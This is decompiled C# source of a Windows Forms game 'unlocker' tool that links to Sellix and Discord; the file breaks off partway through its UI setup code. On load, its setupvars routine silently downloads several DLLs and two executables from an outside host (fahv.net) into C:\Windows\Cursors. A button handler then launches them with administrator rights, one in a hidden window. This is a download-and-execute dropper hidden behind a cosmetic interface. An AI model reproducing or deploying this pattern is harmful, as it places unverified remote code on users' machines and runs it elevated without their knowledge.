// Decompiled with JetBrains decompiler
// Type: Registry.Main
// Assembly: "Dron's Unlocker", Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 05A23AB4-AE9D-4CC7-9B58-77B3FAA021E6
// Assembly location: C:\Users\twist\Desktop\Dron's Unlocker_protected_dump.dem.justify.exe

using Bunifu.Framework.UI;
using Siticone.UI.WinForms;
using Siticone.UI.WinForms.Suite;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Registry
{
    public class Main : Form
    {
        private IContainer components;
        private Siticone.UI.WinForms.Suite.Panel panel1;
        private Label label1;
        private Siticone.UI.WinForms.Suite.Panel panel2;
        private System.Windows.Forms.GroupBox groupBox4;
        private SiticoneButton closeapp;
        private SiticoneImageButton siticoneImageButton2;
        private SiticoneImageButton siticoneImageButton1;
        private SiticoneButton siticoneButton4;
        private Siticone.UI.WinForms.Suite.Panel UserInfo;
        private Siticone.UI.WinForms.Suite.PictureBox pictureBox1;
        private SiticoneDragControl siticoneDragControl1;
        private BunifuElipse bunifuElipse1;
        private System.Windows.Forms.Timer Fade;
        private Siticone.UI.WinForms.Suite.PictureBox pictureBox2;
        private ColorDialog colorDialog1;
        private System.Windows.Forms.GroupBox groupBox7;
        private SiticoneButton siticoneButton5;
        private System.Windows.Forms.GroupBox groupBox5;
        private Label unlockstatus;
        private Label label10;
        private Label label11;
        private Label subscription;
        private Label expiration;
        private Label hwid;
        private Label username;
        private Label label16;
        private Label label17;
        private System.Windows.Forms.GroupBox groupBox3;
        private Label label7;
        private SiticoneCustomCheckBox siticoneCustomCheckBox1;
        private SiticoneColorTransition siticoneColorTransition1;
        private System.Windows.Forms.GroupBox groupBox2;
        private SiticoneButton siticoneButton3;
        private SiticoneButton unlockmw;
        private System.Windows.Forms.GroupBox groupBox1;
        private SiticonePanel siticonePanel1;
        private RichTextBox NewsBOX;
        private System.Windows.Forms.GroupBox groupBox6;
        private Label label5;
        private Label label18;

        public Main() => this.InitializeComponent();

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {
        }

        private void setupvars()
        {
            Process[] processes = Process.GetProcesses();
            foreach (Process pr in processes)
            {
                if (pr.ProcessName == "ul4")
                {
                    pr.Kill();
                    MessageBox.Show("Closing a previous load...", "Unlock Tool", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    System.Threading.Thread.Sleep(2000);
                }
                if (pr.ProcessName == "runasadmin")
                {
                    pr.Kill();
                    MessageBox.Show("Closing a previous load...", "Unlock Tool", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    System.Threading.Thread.Sleep(2000);
                }
            }
            if (File.Exists("C:\\Windows\\Cursors\\Newtonsoft.Json.dll"))
            {
                File.Delete("C:\\Windows\\Cursors\\Newtonsoft.Json.dll");
            }
            if (File.Exists("C:\\Windows\\Cursors\\ReaLTaiizor.dll"))
            {
                File.Delete("C:\\Windows\\Cursors\\ReaLTaiizor.dll");
            }
            if (File.Exists("C:\\Windows\\Cursors\\System.Diagnostics.EventLog.dll"))
            {
                File.Delete("C:\\Windows\\Cursors\\System.Diagnostics.EventLog.dll");
            }
            if (File.Exists("C:\\Windows\\Cursors\\System.Security.Principal.Windows.dll"))
            {
                File.Delete("C:\\Windows\\Cursors\\System.Security.Principal.Windows.dll");
            }
            if (File.Exists("C:\\Windows\\Cursors\\System.ServiceProcess.ServiceController.dll"))
            {
                File.Delete("C:\\Windows\\Cursors\\System.ServiceProcess.ServiceController.dll");
            }
            if (File.Exists("C:\\Windows\\Cursors\\ul4.exe"))
            {
                File.Delete("C:\\Windows\\Cursors\\ul4.exe");
            }
            if (File.Exists("C:\\Windows\\Cursors\\RunAsAdmin.exe"))
            {
                File.Delete("C:\\Windows\\Cursors\\RunAsAdmin.exe");
            }
            WebClient webClient = new WebClient();
            webClient.DownloadFile("http://fahv.net/Newtonsoft.Json.dll", "C:\\Windows\\Cursors\\Newtonsoft.Json.dll");
            WebClient webClient2 = new WebClient();
            webClient2.DownloadFile("http://fahv.net/ReaLTaiizor.dll", "C:\\Windows\\Cursors\\ReaLTaiizor.dll");
            WebClient webClient3 = new WebClient();
            webClient3.DownloadFile("http://fahv.net/System.Diagnostics.EventLog.dll", "C:\\Windows\\Cursors\\System.Diagnostics.EventLog.dll");
            WebClient webClient4 = new WebClient();
            webClient4.DownloadFile("http://fahv.net/System.Security.Principal.Windows.dll", "C:\\Windows\\Cursors\\System.Security.Principal.Windows.dll");
            WebClient webClient5 = new WebClient();
            webClient5.DownloadFile("http://fahv.net/System.ServiceProcess.ServiceController.dll", "C:\\Windows\\Cursors\\System.ServiceProcess.ServiceController.dll");
            WebClient webClient6 = new WebClient();
            webClient6.DownloadFile("http://fahv.net/ul4.exe", "C:\\Windows\\Cursors\\ul4.exe");
            WebClient webClient7 = new WebClient();
            webClient7.DownloadFile("http://fahv.net/RunAsAdmin.exe", "C:\\Windows\\Cursors\\RunAsAdmin.exe");
        }
        private bool ProgramIsRunning(string FullPath)
        {
            string FilePath = Path.GetDirectoryName(FullPath);
            string FileName = Path.GetFileNameWithoutExtension(FullPath).ToLower();
            bool isRunning = false;

            Process[] pList = Process.GetProcessesByName(FileName);

            foreach (Process p in pList)
            {
                if (p.MainModule.FileName.StartsWith(FilePath, StringComparison.InvariantCultureIgnoreCase))
                {
                    isRunning = true;
                    break;
                }
            }

            return isRunning;
        }
        private void siticoneImageButton2_Click(object sender, EventArgs e) => this.UserInfo.SendToBack();

        public DateTime UnixTimeToDateTime(long unixtime) => new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Local).AddSeconds((double)unixtime).ToLocalTime();
        private void siticoneButton3_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }
    private void Main_Load(object sender, EventArgs e)
    {
      this.setupvars();
      this.Fade.Start();
      this.username.Text = "fahv";
      this.expiration.Text = "Lifetime";
      this.hwid.Text = "Unknown";
      this.subscription.Text = "regular";
      string str = "";
      using (WebClient webClient = new WebClient())
        str = webClient.DownloadString("https://pastebin.com/raw/dzspXcL3");
      this.unlockstatus.Text = str;
      if (this.unlockstatus.Text == "Undetected")
        this.unlockstatus.ForeColor = Color.Green;
      if (this.unlockstatus.Text == "Updating")
      {
        ((Control) this.unlockmw).Enabled = false;
        this.unlockstatus.ForeColor = Color.Orange;
      }
      if (this.unlockstatus.Text == "Disabled")
      {
        ((Control) this.unlockmw).Enabled = false;
        this.unlockstatus.ForeColor = Color.Red;
      }
      using (WebClient webClient = new WebClient())
        this.NewsBOX.Text = webClient.DownloadString("https://pastebin.com/raw/xntezWy5");
    }

    private void label5_Click(object sender, EventArgs e)
    {
    }

    private void siticoneImageButton1_Click(object sender, EventArgs e) => this.UserInfo.BringToFront();



    private void Fade_Tick(object sender, EventArgs e) => this.Opacity += 0.2;

    private void siticoneCustomCheckBox1_CheckedChanged(object sender, EventArgs e)
    {
      if (this.siticoneCustomCheckBox1.Checked)
        this.TopMost = true;
      else
        this.TopMost = false;
    }

    private void siticoneButton4_Click(object sender, EventArgs e)
    {
      if (this.colorDialog1.ShowDialog() != DialogResult.OK)
        return;
      this.groupBox1.ForeColor = this.colorDialog1.Color;
      this.groupBox2.ForeColor = this.colorDialog1.Color;
      this.groupBox3.ForeColor = this.colorDialog1.Color;
      this.groupBox4.ForeColor = this.colorDialog1.Color;
      this.groupBox5.ForeColor = this.colorDialog1.Color;
      this.groupBox6.ForeColor = this.colorDialog1.Color;
      this.groupBox7.ForeColor = this.colorDialog1.Color;
      this.NewsBOX.ForeColor = this.colorDialog1.Color;
      this.panel1.BackColor = this.colorDialog1.Color;
      this.label7.ForeColor = this.colorDialog1.Color;
      this.closeapp.FillColor = this.colorDialog1.Color;
      this.unlockmw.FillColor = this.colorDialog1.Color;
      this.siticoneButton3.FillColor = this.colorDialog1.Color;
      this.siticoneButton4.FillColor = this.colorDialog1.Color;
      this.siticoneButton5.FillColor = this.colorDialog1.Color;
      this.subscription.ForeColor = this.colorDialog1.Color;
      this.siticoneCustomCheckBox1.CheckedState.FillColor = this.colorDialog1.Color;
    }

    private void siticoneButton3_Click_1(object sender, EventArgs e) => Process.Start("https://discord.gg/8Vb53rgBzQ");

    private void siticoneButton5_Click(object sender, EventArgs e) => Process.Start("https://sellix.io/");

    private void statusTB_Click(object sender, EventArgs e)
    {
    }

    private async void siticoneButton1_Click(object sender, EventArgs e)
    {
            Process.Start(new ProcessStartInfo()
            {
                Verb = "runas",
                UseShellExecute = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                FileName = "C:\\Windows\\Cursors\\RunAsAdmin.exe"
            });
            await Task.Delay(500);
            foreach (Process process in Process.GetProcesses())
            {
                if (process.ProcessName == "RunAsAdmin")
                {
                    process.Kill();
                    Process.Start(new ProcessStartInfo()
                    {
                        Verb = "runas",
                        UseShellExecute = true,
                        FileName = "C:\\Windows\\Cursors\\ul4.exe"
                    });
                }
            }
    }

    private void groupBox2_Enter(object sender, EventArgs e)
    {
    }

    private void groupBox1_Enter(object sender, EventArgs e)
    {
    }

    private void siticonePanel1_Paint(object sender, PaintEventArgs e)
    {
    }

    private void label1_Click(object sender, EventArgs e)
    {
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Main));
            this.panel1 = new Siticone.UI.WinForms.Suite.Panel();
            this.closeapp = new Siticone.UI.WinForms.SiticoneButton();
            this.label1 = new System.Windows.Forms.Label();
            this.panel2 = new Siticone.UI.WinForms.Suite.Panel();
            this.siticoneImageButton2 = new Siticone.UI.WinForms.SiticoneImageButton();
            this.siticoneImageButton1 = new Siticone.UI.WinForms.SiticoneImageButton();
            this.groupBox4 = new System.Windows.Forms.GroupBox();
            this.siticoneButton4 = new Siticone.UI.WinForms.SiticoneButton();
            this.UserInfo = new Siticone.UI.WinForms.Suite.Panel();
            this.groupBox5 = new System.Windows.Forms.GroupBox();
            this.unlockstatus = new System.Windows.Forms.Label();
            this.label10 = new System.Windows.Forms.Label();
            this.label11 = new System.Windows.Forms.Label();
            this.subscription = new System.Windows.Forms.Label();
            this.expiration = new System.Windows.Forms.Label();
            this.hwid = new System.Windows.Forms.Label();
            this.username = new System.Windows.Forms.Label();
            this.label16 = new System.Windows.Forms.Label();
            this.label17 = new System.Windows.Forms.Label();
            this.label18 = new System.Windows.Forms.Label();
            this.groupBox7 = new System.Windows.Forms.GroupBox();
            this.siticoneButton5 = new Siticone.UI.WinForms.SiticoneButton();
            this.pictureBox2 = new Siticone.UI.WinForms.Suite.PictureBox();
            this.siticoneDragControl1 = new Siticone.UI.WinForms.SiticoneDragControl(this.components);
            this.bunifuElipse1 = new Bunifu.Framework.UI.BunifuElipse(this.components);
            this.Fade = new System.Windows.Forms.Timer(this.components);
            this.colorDialog1 = new System.Windows.Forms.ColorDialog();
            this.siticoneCustomCheckBox1 = new Siticone.UI.WinForms.SiticoneCustomCheckBox();
            this.label7 = new System.Windows.Forms.Label();
            this.groupBox3 = new System.Windows.Forms.GroupBox();
            this.siticoneColorTransition1 = new Siticone.UI.WinForms.SiticoneColorTransition(this.components);
            this.unlockmw = new Siticone.UI.WinForms.SiticoneButton();
            this.siticoneButton3 = new Siticone.UI.WinForms.SiticoneButton();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.siticonePanel1 = new Siticone.UI.WinForms.SiticonePanel();
            this.NewsBOX = new System.Windows.Forms.RichTextBox();
            this.groupBox6 = new System.Windows.Forms.GroupBox();
            this.label5 = new System.Windows.Forms.Label();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.pictureBox1 = new Siticone.UI.WinForms.Suite.PictureBox();
            this.panel1.SuspendLayout();
            this.panel2.SuspendLayout();
            this.groupBox4.SuspendLayout();
            this.UserInfo.SuspendLayout();
            this.groupBox5.SuspendLayout();
            this.groupBox7.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
            this.groupBox3.SuspendLayout();
            this.groupBox2.SuspendLayout();
            this.siticonePanel1.SuspendLayout();
            this.groupBox6.SuspendLayout();
            this.groupBox1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // panel1
            // 
            this.panel1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(6)))), ((int)(((byte)(9)))), ((int)(((byte)(11)))));
            this.panel1.Controls.Add(this.closeapp);
            this.panel1.Controls.Add(this.label1);
            this.panel1.Location = new System.Drawing.Point(0, 0);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(552, 47);
            this.panel1.TabIndex = 1;
            // 
            // closeapp
            // 
            this.closeapp.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(6)))), ((int)(((byte)(9)))), ((int)(((byte)(11)))));
            this.closeapp.BorderColor = System.Drawing.Color.Transparent;
            this.closeapp.BorderStyle = System.Drawing.Drawing2D.DashStyle.Custom;
            this.closeapp.CheckedState.Parent = this.closeapp;
            this.closeapp.CustomImages.Parent = this.closeapp;
            this.closeapp.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(6)))), ((int)(((byte)(9)))), ((int)(((byte)(11)))));
            this.closeapp.Font = new System.Drawing.Font("Microsoft YaHei", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.closeapp.ForeColor = System.Drawing.Color.White;
            this.closeapp.HoveredState.Parent = this.closeapp;
            this.closeapp.Location = new System.Drawing.Point(487, 0);
            this.closeapp.Name = "closeapp";
            this.closeapp.ShadowDecoration.Parent = this.closeapp;
            this.closeapp.Size = new System.Drawing.Size(48, 46);
            this.closeapp.TabIndex = 4;
            this.closeapp.Text = "X";
            this.closeapp.Click += new System.EventHandler(this.siticoneButton3_Click);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.BackColor = System.Drawing.Color.Transparent;
            this.label1.Font = new System.Drawing.Font("Microsoft YaHei UI", 12.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.ForeColor = System.Drawing.Color.White;
            this.label1.Location = new System.Drawing.Point(189, 15);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(146, 24);
            this.label1.TabIndex = 2;
            this.label1.Text = "Dron\'s Unlocker";
            this.label1.Click += new System.EventHandler(this.label1_Click);
            // 
            // panel2
            // 
            this.panel2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(6)))), ((int)(((byte)(9)))), ((int)(((byte)(11)))));
            this.panel2.Controls.Add(this.siticoneImageButton2);
            this.panel2.Controls.Add(this.siticoneImageButton1);
            this.panel2.Location = new System.Drawing.Point(0, 47);
            this.panel2.Name = "panel2";
            this.panel2.Size = new System.Drawing.Size(51, 318);
            this.panel2.TabIndex = 3;
            // 
            // siticoneImageButton2
            // 
            this.siticoneImageButton2.BackgroundImage = global::Properties.Resources.siticoneImageButton21;
            this.siticoneImageButton2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.siticoneImageButton2.CheckedState.Parent = this.siticoneImageButton2;
            this.siticoneImageButton2.HoveredState.Parent = this.siticoneImageButton2;
            this.siticoneImageButton2.Image = global::Properties.Resources.siticoneImageButton21;
            this.siticoneImageButton2.Location = new System.Drawing.Point(2, 1);
            this.siticoneImageButton2.Name = "siticoneImageButton2";
            this.siticoneImageButton2.PressedState.Parent = this.siticoneImageButton2;
            this.siticoneImageButton2.Size = new System.Drawing.Size(48, 46);
            this.siticoneImageButton2.TabIndex = 9;
            this.siticoneImageButton2.Click += new System.EventHandler(this.siticoneImageButton2_Click);
            // 
            // siticoneImageButton1
            // 
            this.siticoneImageButton1.BackgroundImage = global::Properties.Resources.siticoneImageButton11;
            this.siticoneImageButton1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.siticoneImageButton1.CheckedState.Parent = this.siticoneImageButton1;
            this.siticoneImageButton1.HoveredState.Parent = this.siticoneImageButton1;
            this.siticoneImageButton1.Image = global::Properties.Resources.siticoneImageButton11;
            this.siticoneImageButton1.Location = new System.Drawing.Point(2, 53);
            this.siticoneImageButton1.Name = "siticoneImageButton1";
            this.siticoneImageButton1.PressedState.Parent = this.siticoneImageButton1;
            this.siticoneImageButton1.Size = new System.Drawing.Size(48, 46);
            this.siticoneImageButton1.TabIndex = 8;
            this.siticoneImageButton1.Click += new System.EventHandler(this.siticoneImageButton1_Click);
            // 
            // groupBox4
            // 
            this.groupBox4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(6)))), ((int)(((byte)(9)))), ((int)(((byte)(11)))));
            this.groupBox4.Controls.Add(this.siticoneButton4);
            this.groupBox4.Font = new System.Drawing.Font("Microsoft YaHei UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.groupBox4.ForeColor = System.Drawing.Color.DodgerBlue;
            this.groupBox4.Location = new System.Drawing.Point(297, 134);
            this.groupBox4.Name = "groupBox4";
            this.groupBox4.Size = new System.Drawing.Size(207, 70);
            this.groupBox4.TabIndex = 7;
            this.groupBox4.TabStop = false;
            this.groupBox4.Text = "Color Settings";
            // 
            // siticoneButton4
            // 
            this.siticoneButton4.BackColor = System.Drawing.Color.Transparent;
            this.siticoneButton4.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.siticoneButton4.BorderRadius = 4;
            this.siticoneButton4.BorderStyle = System.Drawing.Drawing2D.DashStyle.Custom;
            this.siticoneButton4.BorderThickness = 1;
            this.siticoneButton4.CheckedState.Parent = this.siticoneButton4;
            this.siticoneButton4.CustomImages.Parent = this.siticoneButton4;
            this.siticoneButton4.FillColor = System.Drawing.Color.DodgerBlue;
            this.siticoneButton4.Font = new System.Drawing.Font("Microsoft YaHei UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.siticoneButton4.ForeColor = System.Drawing.Color.White;
            this.siticoneButton4.HoveredState.Parent = this.siticoneButton4;
            this.siticoneButton4.Location = new System.Drawing.Point(15, 22);
            this.siticoneButton4.Name = "siticoneButton4";
            this.siticoneButton4.ShadowDecoration.Parent = this.siticoneButton4;
            this.siticoneButton4.Size = new System.Drawing.Size(175, 38);
            this.siticoneButton4.TabIndex = 4;
            this.siticoneButton4.Text = "Change UI Color";
            this.siticoneButton4.Click += new System.EventHandler(this.siticoneButton4_Click);
            // 
            // UserInfo
            // 
            this.UserInfo.Controls.Add(this.groupBox5);
            this.UserInfo.Controls.Add(this.groupBox7);
            this.UserInfo.Controls.Add(this.pictureBox2);
            this.UserInfo.Location = new System.Drawing.Point(61, 52);
            this.UserInfo.Name = "UserInfo";
            this.UserInfo.Size = new System.Drawing.Size(461, 300);
            this.UserInfo.TabIndex = 9;
            this.UserInfo.Paint += new System.Windows.Forms.PaintEventHandler(this.UserInfo_Paint);
            // 
            // groupBox5
            // 
            this.groupBox5.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(6)))), ((int)(((byte)(9)))), ((int)(((byte)(11)))));
            this.groupBox5.Controls.Add(this.unlockstatus);
            this.groupBox5.Controls.Add(this.label10);
            this.groupBox5.Controls.Add(this.label11);
            this.groupBox5.Controls.Add(this.subscription);
            this.groupBox5.Controls.Add(this.expiration);
            this.groupBox5.Controls.Add(this.hwid);
            this.groupBox5.Controls.Add(this.username);
            this.groupBox5.Controls.Add(this.label16);
            this.groupBox5.Controls.Add(this.label17);
            this.groupBox5.Controls.Add(this.label18);
            this.groupBox5.Font = new System.Drawing.Font("Microsoft YaHei UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.groupBox5.ForeColor = System.Drawing.Color.DodgerBlue;
            this.groupBox5.Location = new System.Drawing.Point(32, 16);
            this.groupBox5.Name = "groupBox5";
            this.groupBox5.Size = new System.Drawing.Size(397, 130);
            this.groupBox5.TabIndex = 13;
            this.groupBox5.TabStop = false;
            this.groupBox5.Text = "User Information";
            // 
            // unlockstatus
            // 
            this.unlockstatus.AutoSize = true;
            this.unlockstatus.BackColor = System.Drawing.Color.Transparent;
            this.unlockstatus.Font = new System.Drawing.Font("Microsoft YaHei UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.unlockstatus.ForeColor = System.Drawing.Color.White;
            this.unlockstatus.Location = new System.Drawing.Point(131, 35);
            this.unlockstatus.Name = "unlockstatus";
            this.unlockstatus.Size = new System.Drawing.Size(29, 16);
            this.unlockstatus.TabIndex = 8;
            this.unlockstatus.Text = "N/A";
            // 
            // label10
            // 
            this.label10.AutoSize = true;
            this.label10.BackColor = System.Drawing.Color.Transparent;
            this.label10.Font = new System.Drawing.Font("Microsoft YaHei UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label10.ForeColor = System.Drawing.Color.White;
            this.label10.Location = new System.Drawing.Point(19, 34);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(115, 17);
            this.label10.TabIndex = 5;
            this.label10.Text = "Unlocker Status  :";
            // 
            // label11
            // 
            this.label11.AutoSize = true;
            this.label11.ForeColor = System.Drawing.Color.White;
            this.label11.Location = new System.Drawing.Point(19, 98);
            this.label11.Name = "label11";
            this.label11.Size = new System.Drawing.Size(82, 17);
            this.label11.TabIndex = 7;
            this.label11.Text = "Subscribed :";
            // 
            // subscription
            // 
            this.subscription.AutoSize = true;
            this.subscription.Font = new System.Drawing.Font("Microsoft YaHei UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.subscription.ForeColor = System.Drawing.Color.DodgerBlue;
            this.subscription.Location = new System.Drawing.Point(98, 99);
            this.subscription.Name = "subscription";
            this.subscription.Size = new System.Drawing.Size(29, 16);
            this.subscription.TabIndex = 6;
            this.subscription.Text = "N/A";
            // 
            // expiration
            // 
            this.expiration.AutoSize = true;
            this.expiration.Font = new System.Drawing.Font("Microsoft YaHei UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.expiration.Location = new System.Drawing.Point(94, 67);
            this.expiration.Name = "expiration";
            this.expiration.Size = new System.Drawing.Size(29, 16);
            this.expiration.TabIndex = 5;
            this.expiration.Text = "N/A";
            // 
            // hwid
            // 
            this.hwid.AutoSize = true;
            this.hwid.Font = new System.Drawing.Font("Microsoft YaHei UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.hwid.Location = new System.Drawing.Point(68, 83);
            this.hwid.Name = "hwid";
            this.hwid.Size = new System.Drawing.Size(29, 16);
            this.hwid.TabIndex = 4;
            this.hwid.Text = "N/A";
            // 
            // username
            // 
            this.username.AutoSize = true;
            this.username.Font = new System.Drawing.Font("Microsoft YaHei UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.username.Location = new System.Drawing.Point(92, 52);
            this.username.Name = "username";
            this.username.Size = new System.Drawing.Size(29, 16);
            this.username.TabIndex = 3;
            this.username.Text = "N/A";
            // 
            // label16
            // 
            this.label16.AutoSize = true;
            this.label16.ForeColor = System.Drawing.Color.White;
            this.label16.Location = new System.Drawing.Point(19, 66);
            this.label16.Name = "label16";
            this.label16.Size = new System.Drawing.Size(78, 17);
            this.label16.TabIndex = 2;
            this.label16.Text = "Expiration :";
            // 
            // label17
            // 
            this.label17.AutoSize = true;
            this.label17.ForeColor = System.Drawing.Color.White;
            this.label17.Location = new System.Drawing.Point(19, 82);
            this.label17.Name = "label17";
            this.label17.Size = new System.Drawing.Size(56, 17);
            this.label17.TabIndex = 1;
            this.label17.Text = "HWID : ";
            // 
            // label18
            // 
            this.label18.AutoSize = true;
            this.label18.ForeColor = System.Drawing.Color.White;
            this.label18.Location = new System.Drawing.Point(19, 51);
            this.label18.Name = "label18";
            this.label18.Size = new System.Drawing.Size(76, 17);
            this.label18.TabIndex = 0;
            this.label18.Text = "Username :";
            // 
            // groupBox7
            // 
            this.groupBox7.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(6)))), ((int)(((byte)(9)))), ((int)(((byte)(11)))));
            this.groupBox7.Controls.Add(this.siticoneButton5);
            this.groupBox7.Font = new System.Drawing.Font("Microsoft YaHei UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.groupBox7.ForeColor = System.Drawing.Color.DodgerBlue;
            this.groupBox7.Location = new System.Drawing.Point(32, 213);
            this.groupBox7.Name = "groupBox7";
            this.groupBox7.Size = new System.Drawing.Size(397, 66);
            this.groupBox7.TabIndex = 9;
            this.groupBox7.TabStop = false;
            this.groupBox7.Text = "Other Stuff";
            // 
            // siticoneButton5
            // 
            this.siticoneButton5.BackColor = System.Drawing.Color.Transparent;
            this.siticoneButton5.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.siticoneButton5.BorderRadius = 4;
            this.siticoneButton5.BorderStyle = System.Drawing.Drawing2D.DashStyle.Custom;
            this.siticoneButton5.BorderThickness = 1;
            this.siticoneButton5.CheckedState.Parent = this.siticoneButton5;
            this.siticoneButton5.CustomImages.Parent = this.siticoneButton5;
            this.siticoneButton5.FillColor = System.Drawing.Color.DodgerBlue;
            this.siticoneButton5.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.siticoneButton5.ForeColor = System.Drawing.Color.White;
            this.siticoneButton5.HoveredState.Parent = this.siticoneButton5;
            this.siticoneButton5.Location = new System.Drawing.Point(11, 22);
            this.siticoneButton5.Name = "siticoneButton5";
            this.siticoneButton5.ShadowDecoration.Parent = this.siticoneButton5;
            this.siticoneButton5.Size = new System.Drawing.Size(374, 33);
            this.siticoneButton5.TabIndex = 5;
            this.siticoneButton5.Text = "Sellix";
            this.siticoneButton5.Click += new System.EventHandler(this.siticoneButton5_Click);
            // 
            // pictureBox2
            // 
            this.pictureBox2.Image = global::Registry.Properties.Resources.giphy;
            this.pictureBox2.Location = new System.Drawing.Point(3, 8);
            this.pictureBox2.Name = "pictureBox2";
            this.pictureBox2.Size = new System.Drawing.Size(455, 289);
            this.pictureBox2.TabIndex = 11;
            this.pictureBox2.TabStop = false;
            // 
            // siticoneDragControl1
            // 
            this.siticoneDragControl1.TargetControl = this.panel1;
            // 
            // bunifuElipse1
            // 
            this.bunifuElipse1.ElipseRadius = 5;
            this.bunifuElipse1.TargetControl = this;
            // 
            // Fade
            // 
            this.Fade.Enabled = true;
            this.Fade.Tick += new System.EventHandler(this.Fade_Tick);
            // 
            // siticoneCustomCheckBox1
            // 
            this.siticoneCustomCheckBox1.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.siticoneCustomCheckBox1.CheckedState.BorderRadius = 2;
            this.siticoneCustomCheckBox1.CheckedState.BorderThickness = 0;
            this.siticoneCustomCheckBox1.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.siticoneCustomCheckBox1.CheckedState.Parent = this.siticoneCustomCheckBox1;
            this.siticoneCustomCheckBox1.Location = new System.Drawing.Point(19, 25);
            this.siticoneCustomCheckBox1.Name = "siticoneCustomCheckBox1";
            this.siticoneCustomCheckBox1.ShadowDecoration.Parent = this.siticoneCustomCheckBox1;
            this.siticoneCustomCheckBox1.Size = new System.Drawing.Size(28, 27);
            this.siticoneCustomCheckBox1.TabIndex = 0;
            this.siticoneCustomCheckBox1.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.siticoneCustomCheckBox1.UncheckedState.BorderRadius = 2;
            this.siticoneCustomCheckBox1.UncheckedState.BorderThickness = 0;
            this.siticoneCustomCheckBox1.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.siticoneCustomCheckBox1.UncheckedState.Parent = this.siticoneCustomCheckBox1;
            this.siticoneCustomCheckBox1.CheckedChanged += new System.EventHandler(this.siticoneCustomCheckBox1_CheckedChanged);
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.BackColor = System.Drawing.Color.Transparent;
            this.label7.Font = new System.Drawing.Font("Microsoft YaHei UI", 12.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label7.ForeColor = System.Drawing.Color.White;
            this.label7.Location = new System.Drawing.Point(58, 28);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(115, 24);
            this.label7.TabIndex = 5;
            this.label7.Text = "Top Most UI";
            // 
            // groupBox3
            // 
            this.groupBox3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(6)))), ((int)(((byte)(9)))), ((int)(((byte)(11)))));
            this.groupBox3.Controls.Add(this.label7);
            this.groupBox3.Controls.Add(this.siticoneCustomCheckBox1);
            this.groupBox3.Font = new System.Drawing.Font("Microsoft YaHei UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
